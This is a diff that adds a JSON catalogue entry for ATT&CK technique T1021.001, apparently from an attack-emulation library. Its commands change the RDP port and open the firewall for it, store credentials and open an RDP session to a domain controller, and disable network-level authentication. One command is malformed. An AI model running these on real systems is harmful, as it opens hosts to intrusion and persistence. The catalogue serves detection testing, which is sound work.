@@ -1,0 +1,22 @@
+   "T1021.001": {
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "tactic": "lateral-movement",
+      "known implementations": [
+         {
+            "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
+            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489"
+         },
+         {
+            "description": "Changing RDP Port to Non Standard Port via Powershell\n",
+            "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489"
+         },
+         {
+            "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
+            "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\""
+         },
+         {
+            "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
+            "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
+         }
+      ]
+   },
